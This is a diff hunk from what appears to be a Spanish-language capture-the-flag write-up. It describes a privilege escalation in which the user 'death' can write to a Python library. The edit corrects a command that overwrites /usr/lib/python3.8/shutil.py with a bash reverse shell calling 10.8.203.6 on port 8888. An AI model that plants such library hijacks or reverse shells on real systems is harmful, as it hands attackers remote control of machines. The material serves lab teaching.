@@ -131,5 +131,5 @@ hacemos una peticion con wget al servidor para bajarnos el archivo
 ### podemos ver que el usuario death tiene permisos de lectura y escritura sobre esta libreria asi que aprovecharemos esto para modificarla con el siguiente comando 
 
 ```python
-	echo "import os; os.system(\"bash -c 'bash -i >& /dev/tcp/10.8.203.6/8888 0>1'\")" > /usr/lib/python3.8/shutil.py
+	echo "import os; os.system(\"bash -c 'bash -i >& /dev/tcp/10.8.203.6/8888 0>&1'\")" > /usr/lib/python3.8/shutil.py
 ```
